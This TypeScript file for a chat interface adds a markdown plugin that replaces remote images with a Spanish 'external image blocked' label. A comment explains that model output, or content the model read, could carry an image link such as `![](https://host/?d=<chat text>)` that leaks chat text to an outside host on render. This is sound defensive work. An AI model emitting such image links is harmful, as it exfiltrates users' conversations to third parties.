import type { Root } from 'hast'
import { defaultRehypePlugins } from 'streamdown'
import { SKIP, visit } from 'unist-util-visit'

// Loading these needs no request to anyone: the bytes are already on this PC.
const LOCAL_IMAGE = /^(?:data:image\/|blob:|asset:\/\/|https?:\/\/asset\.localhost\/)/i

/**
 * Keeps text from a model, or from whatever it read, from making the app fetch a
 * URL. An image loads the moment it renders, with no click and no approval, so
 * `![](https://host/?d=<chat text>)` would hand that text to the host even in a
 * local-only chat. The CSP cannot stop it because the interface needs remote
 * images of its own, so remote images are refused here.
 */
export function blockRemoteImages() {
  return (tree: Root) => {
    visit(tree, 'element', (node, index, parent) => {
      if (node.tagName !== 'img' || !parent || index === undefined) return
      const { src, alt } = node.properties
      if (typeof src === 'string' && LOCAL_IMAGE.test(src)) return
      const label = typeof alt === 'string' ? alt.trim() : ''
      parent.children[index] = {
        type: 'element',
        tagName: 'span',
        properties: { className: ['inline-block', 'rounded', 'bg-muted', 'px-2', 'py-0.5', 'text-xs', 'text-muted-foreground'] },
        children: [{ type: 'text', value: label ? `Imagen externa bloqueada: ${label}` : 'Imagen externa bloqueada' }],
      }
      return [SKIP, index + 1]
    })
  }
}

/** Streamdown's own plugins, for the views that do not need a custom pipeline. */
export const safeStreamdownPlugins = [...Object.values(defaultRehypePlugins), blockRemoteImages]
